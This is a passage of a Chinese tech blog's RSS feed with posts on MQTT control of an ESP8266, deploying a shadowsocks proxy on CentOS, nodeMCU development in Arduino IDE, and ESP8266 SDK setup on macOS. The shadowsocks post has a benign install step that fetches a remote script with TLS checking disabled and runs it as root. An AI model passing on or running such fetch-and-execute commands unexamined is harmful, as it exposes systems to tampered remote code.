&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mosquitto_pub -h &amp;#34;your_mqtt_server&amp;#34; -t &amp;#34;MAC_ADDRESS/downlink&amp;#34; -m &amp;#34;blink#3&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我也是从MQTT服务器端直接发送的控制数据，因此命令可以这样写：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ mosquitto_pub -t &amp;#34;A0:20:A6:18:47:F1/downlink&amp;#34; -m &amp;#34;#blink#3#&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;demo&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#demo&#34;&gt;
        ##
    &lt;/a&gt;
    Demo
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;embed src=&#39;http://player.youku.com/player.php/Type/Folder/Fid//Ob//sid/XMjc1MDE4Njg2MA==/v.swf&#39; quality=&#39;high&#39; width=&#39;480&#39; height=&#39;400&#39; align=&#39;middle&#39; allowScriptAccess=&#39;always&#39; allowFullScreen=&#39;true&#39; mode=&#39;transparent&#39; type=&#39;application/x-shockwave-flash&#39;&gt;&lt;/embed&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://youtu.be/sUh0jkb34zY?list=PLtYMWBKPeJhV7YmKgXZK3j_Pe73ljN-Dx&#34;&gt;Video on YouTube&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文中程序的完整代码可以在&lt;a href=&#34;https://github.com/singleye/esp8266/tree/master/mqtt&#34;&gt;github&lt;/a&gt;上面找到。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>如何在CentOS上部署shadowsocks服务</title>
      <link>/2017/05/%E5%A6%82%E4%BD%95%E5%9C%A8centos%E4%B8%8A%E9%83%A8%E7%BD%B2shadowsocks%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Mon, 01 May 2017 23:39:03 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/05/%E5%A6%82%E4%BD%95%E5%9C%A8centos%E4%B8%8A%E9%83%A8%E7%BD%B2shadowsocks%E6%9C%8D%E5%8A%A1/</guid>
      <description>&lt;h1 id=&#34;shadowsocks简单介绍&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#shadowsocks%e7%ae%80%e5%8d%95%e4%bb%8b%e7%bb%8d&#34;&gt;
        ##
    &lt;/a&gt;
    shadowsocks简单介绍
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;shadowsocks是目前较流行的一种科学上网服务。他的工作原理也比较简单，shadowsocks本质上是socks5代理技术，然而架构方式上将单服务节点拆分成两个子服务：SS Local和SS Server。&lt;/p&gt;
&lt;p&gt;工作过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当本地请求端需要访问时首先将请求发送至本地SS Local服务&lt;/li&gt;
&lt;li&gt;SS Local将数据加密在网络上传输到SS Server，由于信息经过加密不会被GFW提取到特征数据，因此也就翻了墙&lt;/li&gt;
&lt;li&gt;SS Server收到数据后解密并访问真正的远程服务资源&lt;/li&gt;
&lt;li&gt;远程返回数据返回到SS Server&lt;/li&gt;
&lt;li&gt;SS Server将数据加密传输给SS Local&lt;/li&gt;
&lt;li&gt;SS Local收到返回数据解密后发给本地请求端&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/what-is-shadowsocks.png&#34; alt=&#34;What&amp;rsquo;s shadow socks&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;部署shadow-socks服务-ss-server&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%83%a8%e7%bd%b2shadow-socks%e6%9c%8d%e5%8a%a1-ss-server&#34;&gt;
        ##
    &lt;/a&gt;
    部署shadow socks服务 (SS Server)
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;安装服务&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85%e6%9c%8d%e5%8a%a1&#34;&gt;
        #
    &lt;/a&gt;
    安装服务
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;shadowsocks服务的部署也极为简单，已经有完善的脚本帮助安装，需要稍微注意下的就是安装过程需要root权限，安装方法如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh

# sh shadowsocks.sh
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;配置服务&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%85%8d%e7%bd%ae%e6%9c%8d%e5%8a%a1&#34;&gt;
        #
    &lt;/a&gt;
    配置服务
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;shadowsocks的配置文件是&amp;rsquo;/etc/shadowsocks.json&amp;rsquo;，一个简单的配置文件的写法可以参考这个例子。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# cat /etc/shadowsocks.json
{
    &amp;#34;server&amp;#34;:&amp;#34;0.0.0.0&amp;#34;,
    &amp;#34;port_password&amp;#34;:{
        &amp;#34;8989&amp;#34;:&amp;#34;password1&amp;#34;,    &amp;lt;--- 第一个服务端口及访问密码
        &amp;#34;8990&amp;#34;:&amp;#34;password2&amp;#34;     &amp;lt;--- 多个服务端口指定方法
    },
    &amp;#34;timeout&amp;#34;:300,
    &amp;#34;method&amp;#34;:&amp;#34;aes-256-cfb&amp;#34;,    &amp;lt;--- 注意这个加密方式，配置SS Local需要使用
    &amp;#34;fast_open&amp;#34;:false,
    &amp;#34;workers&amp;#34;:2
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;多数情况下一个端口就可以满足使用了，这个例子中提供了多个访问端口的配置方法，具体用法可以根据自己的实际情况配置。&lt;/p&gt;
&lt;h2 id=&#34;启动服务&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%90%af%e5%8a%a8%e6%9c%8d%e5%8a%a1&#34;&gt;
        #
    &lt;/a&gt;
    启动服务
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;服务安装过程同时会安装一个启动脚本&amp;rsquo;/etc/init.d/shadowsocks&amp;rsquo;，启动方法也很简单。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# service shadowsocks start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;为了确保每次系统启动后服务会自动运行最好将服务使用chkconfig进行启用，这样就不必担心系统被运营商或者管理员维护重启后无法使用了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;chkconfig --add shadowsocks
chkconfig --level 2345 shadowsocks on
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;客户端使用方法ss-local&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%a2%e6%88%b7%e7%ab%af%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95ss-local&#34;&gt;
        ##
    &lt;/a&gt;
    客户端使用方法（SS Local）
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;本人使用的是MBP，先分享一下Mac OS上的使用方法。&lt;/p&gt;
&lt;h2 id=&#34;下载安装ss-local&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%8b%e8%bd%bd%e5%ae%89%e8%a3%85ss-local&#34;&gt;
        #
    &lt;/a&gt;
    下载安装SS Local
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;可以在这里下载&lt;a href=&#34;https://github.com/shadowsocks/ShadowsocksX-NG/releases/&#34;&gt;ShadowsocksX-NG&lt;/a&gt;这个软件，将这个软件安装到应用程序中就可以打开使用了，但首先需要一些设置。&lt;/p&gt;
&lt;h2 id=&#34;配置ss-local&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%85%8d%e7%bd%aess-local&#34;&gt;
        #
    &lt;/a&gt;
    配置SS Local
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;程序运行后可以看到一个小飞机样子的图标，点击后可以看到配置菜单。&lt;/p&gt;
&lt;h3 id=&#34;第一步打开配置界面&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e6%ad%a5%e6%89%93%e5%bc%80%e9%85%8d%e7%bd%ae%e7%95%8c%e9%9d%a2&#34;&gt;
        ##
    &lt;/a&gt;
    第一步：打开配置界面
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-icon.png&#34; alt=&#34;Step1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;第二步配置ss-local连接的ss-server服务器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e9%85%8d%e7%bd%aess-local%e8%bf%9e%e6%8e%a5%e7%9a%84ss-server%e6%9c%8d%e5%8a%a1%e5%99%a8&#34;&gt;
        ##
    &lt;/a&gt;
    第二步：配置SS Local连接的SS Server服务器
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;点击“服务器设置”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-server-1.png&#34; alt=&#34;Step2.1&#34;&gt;&lt;/p&gt;
&lt;p&gt;将配置好的服务填入其中，注意的是“地址”／“端口号”／“加密方法”／“密码”信息需要与SS Server服务端的设置匹配。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-server-2.png&#34; alt=&#34;Step2.2&#34;&gt;&lt;/p&gt;
&lt;p&gt;配置完成后记得在服务器列表中选择刚刚配置好的那项。&lt;/p&gt;
&lt;h3 id=&#34;第三步设置高级服务&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e6%ad%a5%e8%ae%be%e7%bd%ae%e9%ab%98%e7%ba%a7%e6%9c%8d%e5%8a%a1&#34;&gt;
        ##
    &lt;/a&gt;
    第三步：设置“高级服务”
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;国内用户最好指定&amp;quot;GFW LIST URL&amp;quot;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-advanced.png&#34; alt=&#34;Step3&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意，这里有一个&amp;quot;Local PAC Listen Port&amp;quot;信息，这个配置需要在下面一步使用。&lt;/p&gt;
&lt;h3 id=&#34;第四步设置本地代理方式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e5%9b%9b%e6%ad%a5%e8%ae%be%e7%bd%ae%e6%9c%ac%e5%9c%b0%e4%bb%a3%e7%90%86%e6%96%b9%e5%bc%8f&#34;&gt;
        ##
    &lt;/a&gt;
    第四步：设置本地代理方式
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;设置本地代理方式之前最好先将GFW list更新一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-gfw-update.png&#34; alt=&#34;Step4.1&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开“系统偏好设置”-&amp;gt;“网络”-&amp;gt;“高级”-&amp;gt;“代理”，勾选“自动代理配置”，在URL中输入：http://127.0.0.1:8090/proxy.pac&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/05/shadowsocks-NG-local-pac.png&#34; alt=&#34;Step4.2&#34;&gt;&lt;/p&gt;
&lt;p&gt;完成这个设置后就已经可以进行科学上网了，系统访问GFW屏蔽的服务时就会使用配置好的代理服务器。&lt;/p&gt;
&lt;h1 id=&#34;使用kcptun加速&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8kcptun%e5%8a%a0%e9%80%9f&#34;&gt;
        ##
    &lt;/a&gt;
    使用kcptun加速
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;有些时候shadowsocks搭建的主服务器在国外机房中的延迟较大，这样会影响访问速度，这时可以使用一些手段为访问加速，比如&amp;quot;kcptun&amp;quot;。&lt;/p&gt;
&lt;p&gt;TBC&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>使用Arduino IDE进行nodeMCU开发</title>
      <link>/2017/04/%E4%BD%BF%E7%94%A8arduino-ide%E8%BF%9B%E8%A1%8Cnodemcu%E5%BC%80%E5%8F%91/</link>
      <pubDate>Wed, 12 Apr 2017 19:10:33 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/04/%E4%BD%BF%E7%94%A8arduino-ide%E8%BF%9B%E8%A1%8Cnodemcu%E5%BC%80%E5%8F%91/</guid>
      <description>&lt;h1 id=&#34;安装arduino-ide&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85arduino-ide&#34;&gt;
        ##
    &lt;/a&gt;
    安装Arduino IDE
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;这两天发现使用Arduino IDE开发nodeMCU(ESP 8266)非常方便，写出来分享一下。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.下载arduino IDE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Arduino IDE可以在&lt;a href=&#34;https://www.arduino.cc&#34;&gt;Arduino官网&lt;/a&gt;下载到。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.配置开发板管理器网址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开preference，用下面的URL设置“附加开发模版管理器网址”：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://arduino.esp8266.com/stable/package_esp8266com_index.json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/04/arduino_preference_esp8266_setup.png&#34; alt=&#34;preference&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.下载更新8266开发模版&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开“工具”-&amp;gt;“开发板”-&amp;gt;“开发板管理器”，选择“esp8266”并安装。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/04/nodemcu_board_setup_step1.png&#34; alt=&#34;Step1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/04/nodemcu_board_setup_step2.png&#34; alt=&#34;Step2&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装完后在“工具”-&amp;gt;“开发板”中选择对应的开发板型号。&lt;/p&gt;
&lt;h1 id=&#34;安装usb-to-uart驱动&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85usb-to-uart%e9%a9%b1%e5%8a%a8&#34;&gt;
        ##
    &lt;/a&gt;
    安装USB to UART驱动
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;nodeMCU自带Silicon Labs的USB芯片，可以直接使用microUSB进行连接，这对于不太熟悉硬件的爱好者是非常友好的。&lt;/p&gt;
&lt;p&gt;连接前需要在这里下载驱动：&lt;a href=&#34;https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers&#34;&gt;nodeMCU USBtoUART驱动&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;设置uart端口&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%be%e7%bd%aeuart%e7%ab%af%e5%8f%a3&#34;&gt;
        ##
    &lt;/a&gt;
    设置UART端口
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;现在拿出一根microUSB线将nodeMCU连接到电脑上吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/04/nodemcu_usb.jpeg&#34; alt=&#34;USB连接&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时在Arduino IDE中还需要进行最后一个简单设置：“端口”。设置好这个端口后就可以跟板子进行串口通讯了。&lt;/p&gt;
&lt;p&gt;设置过程通过“工具”-&amp;gt;“端口”进行选择。通常情况下应该选择类似&amp;quot;/dev/cu.SLAB_USBtoUART&amp;quot;字样的那个端口。&lt;/p&gt;
&lt;h1 id=&#34;开发烧录程序&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bc%80%e5%8f%91%e7%83%a7%e5%bd%95%e7%a8%8b%e5%ba%8f&#34;&gt;
        ##
    &lt;/a&gt;
    开发烧录程序
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;首先用Arduino IDE自带的例子程序进行说明开发过程。选择&amp;quot;文件&amp;quot;-&amp;gt;&amp;ldquo;示例&amp;rdquo;-&amp;gt;&amp;ldquo;01.Basics&amp;rdquo;-&amp;gt;&amp;ldquo;Blink&amp;rdquo;，将会打开&amp;quot;Blink&amp;quot;例子程序。&lt;/p&gt;
&lt;p&gt;由于nodeMCU的LED灯连在16号管脚上，因此需要简单修改一下这个例子。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#define ESP8266_LED_BUILTIN 16

// the setup function runs once when you press reset or power the board
void setup() {
  // initialize digital pin LED_BUILTIN as an output.
  pinMode(ESP8266_LED_BUILTIN, OUTPUT);
}

// the loop function runs over and over again forever
void loop() {
  digitalWrite(ESP8266_LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
  delay(500);                       // wait for 0.5 second
  digitalWrite(ESP8266_LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
  delay(500);                       // wait for 0.5 second
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后来把写好的程序编译烧录到nodeMCU中吧。点击“上传”按钮将会自动完成这个步骤。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/04/nodemcu_upload.png&#34; alt=&#34;USB连接&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>在Mac OS上设置ESP 8266开发环境</title>
      <link>/2017/04/%E5%9C%A8mac-os%E4%B8%8A%E8%AE%BE%E7%BD%AEesp-8266%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</link>
      <pubDate>Sat, 08 Apr 2017 00:10:24 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/04/%E5%9C%A8mac-os%E4%B8%8A%E8%AE%BE%E7%BD%AEesp-8266%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</guid>
      <description>&lt;p&gt;做物联网产品开发有段时间了，虽然开发了两款智能产品，但hands-on的开发一直都在服务器和应用层进行，硬件层的研发并没有真的深入下去。决定有时间也对这个层面学习学习，软硬都能搞才算得上是全栈吧 :-P&lt;/p&gt;
&lt;p&gt;要完成一个物联网产品的开发需要解决联网的问题。目前解决联网的比较常用的方案有Wi-Fi和GSM两种（NB-IOT也在上升势头，相信一年后会有较多的应用出现）。这次先学习下乐鑫ESP 8266 WI-FI芯片的开发。&lt;/p&gt;
&lt;p&gt;由于我用的是Mac OS，所以就介绍如何在Mac上进行8266的环境设置。&lt;/p&gt;
&lt;h2 id=&#34;安装使用esp-open-sdk&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85%e4%bd%bf%e7%94%a8esp-open-sdk&#34;&gt;
        #
    &lt;/a&gt;
    安装使用esp-open-sdk
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1.安装依赖关系&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;brew install gnu-sed --with-default-names
brew tap homebrew/dupes
brew install gperf
brew install grep
brew install autoconf
brew install binutils
brew install gawk
brew install wget
brew install automake
brew install libtool
brew install help2man
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;http://www.esp8266.com/wiki/doku.php?id=setup-osx-compiler-esp8266#esp-open-sdk_with_brew&#34;&gt;参考&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.准备case-sensitive分区&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于Mac OS的分区默认是case-insensitive的，而编译需要在case-sensitive的分区上进行，所以需要创建一个独立分区解决这个问题(linux系统上没有这个问题)。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hdiutil create ~/Desktop/eos.dmg -volname &amp;#34;esp-open-sdk&amp;#34; -size 10g -fs &amp;#34;Case-sensitive HFS+&amp;#34;
hdiutil mount ~/Desktop/eos.dmg
cd /Volumes/esp-open-sdk
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3.编译esp-open-sdk&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下载代码库，使用&amp;rsquo;&amp;ndash;recursive&amp;rsquo;会同时下载crosstool-NG／esp-open-lwip／esptool／lx106-hal子模块&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone --recursive https://github.com/pfalcon/esp-open-sdk.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;编译有两种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方式一(STANDALONE=y)：将toolchain与SDK一起编译安装，这种方式操作简单方便，而且后期开发编译时不需要指定-I／-L参数，缺点是不便于今后SDK升级。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;make STANDALONE=y
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;方式二(STANDALONE=n)：只编译Xtensa toolchain，不编译8266 SDK，这种方式便于今后SDK升级。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;make STANDALONE=n
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;编译完成后会在当前目录下生成&amp;rsquo;xtensa-lx106-elf&amp;rsquo;目录，将&amp;rsquo;xtensa-lx106-elf/bin&amp;rsquo;添加到PATH环境变量中以便开发时使用编译器&amp;rsquo;xtensa-lx106-elf-gcc&#39;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;export PATH=$PATH:`pwd`/xtensa-lx106-elf/bin/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后，esptool.py使用需要安装&amp;rsquo;pySerial&amp;rsquo;这个python库&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip install pyserial
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;4.测试开发环境&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;esp-open-sdk自带example，可以编译一下来测试开发环境是否设置好了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd examples/blinky
make
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果编译成功通过则说明esp-open-sdk安装成功了。&lt;/p&gt;
&lt;h2 id=&#34;使用esp8266-rtos-sdk&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8esp8266-rtos-sdk&#34;&gt;
        #
    &lt;/a&gt;
    使用ESP8266 RTOS SDK
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;8266还有一套基于FreeRTOS的SDK，配置这套SDK之前需要先完成前面的esp-open-sdk的配置。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.构建SDK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我选择把这套SDK构建到同一个分区上。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /Volumes/esp-open-sdk
git clone https://github.com/espressif/ESP8266_RTOS_SDK.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成后需要设置两个环境变量&amp;rsquo;SDK_PATH&amp;rsquo;, &amp;lsquo;BIN_PATH&amp;rsquo;。为了简化设置我把这连个环境变量设知道&amp;rsquo;~/.bash_profile&amp;rsquo;文件中，这样可以每次打开shell后自动加载：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ESP 8266 dev env
ESP_8266_OPEN_SDK=/Volumes/esp-open-sdk/esp-open-sdk/xtensa-lx106-elf/
ESP_8266_RTOS_SDK=/Volumes/esp-open-sdk/ESP8266_RTOS_SDK
ESP_8266_RTOS_SDK_BIN=/Volumes/esp-open-sdk/ESP8266_RTOS_BIN
export SDK_PATH=$ESP_8266_RTOS_SDK
export BIN_PATH=$ESP_8266_RTOS_SDK_BIN
PATH=$PATH:$ESP_8266_OPEN_SDK/bin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2.开发方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;RTOS SDK的代码目录中有一个样板程序，开发时可以把这个模版拷贝到开发目录中，然后运行gen_misc.sh进行编译。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cp -r examples/project_template ~/test
cd ~/test/project_template
sh gen_misc.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行gen_misc.sh后会有若干选项，按照提示操作下去最后就会编译出的文件会放到‘BIN_PATH’目录下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls /Volumes/esp-open-sdk/ESP8266_RTOS_BIN/
eagle.S             eagle.dump          eagle.flash.bin     eagle.irom0text.bin
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;烧录程序&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%83%a7%e5%bd%95%e7%a8%8b%e5%ba%8f&#34;&gt;
        #
    &lt;/a&gt;
    烧录程序
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;串口驱动&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%b2%e5%8f%a3%e9%a9%b1%e5%8a%a8&#34;&gt;
        ##
    &lt;/a&gt;
    串口驱动
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;烧录前需要先将硬件连到电脑上，如果使用的是nodeMCU的话会比较方便，只需要使用一根micro USB数据线，并下载这个驱动：&lt;a href=&#34;https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers&#34;&gt;nodeMCU USBtoUART驱动&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;烧录工具esptoolpy&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%83%a7%e5%bd%95%e5%b7%a5%e5%85%b7esptoolpy&#34;&gt;
        ##
    &lt;/a&gt;
    烧录工具esptool.py
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;安装完驱动后就可以连接烧录了，程序烧录可以使用esptool.py工具完成，使用方法如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;esptool.py --port &amp;lt;serial-port-of-ESP8266&amp;gt; write_flash -fm &amp;lt;mode&amp;gt; 0x00000 &amp;lt;nodemcu-firmware&amp;gt;.bin
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;参考资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99&#34;&gt;
        #
    &lt;/a&gt;
    参考资料
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/pfalcon/esp-open-sdk&#34;&gt;esp-open-sdk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/espressif/ESP8266_RTOS_SDK&#34;&gt;ESP8266-RTOS-SDK&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>numpy学习笔记[1]</title>
      <link>/2017/03/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</link>
      <pubDate>Thu, 16 Mar 2017 14:45:31 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/03/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</guid>
      <description>&lt;h1 id=&#34;numpy数据结构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#numpy%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84&#34;&gt;
        ##
    &lt;/a&gt;
    numpy数据结构
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;基本数据&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae&#34;&gt;
        #
    &lt;/a&gt;
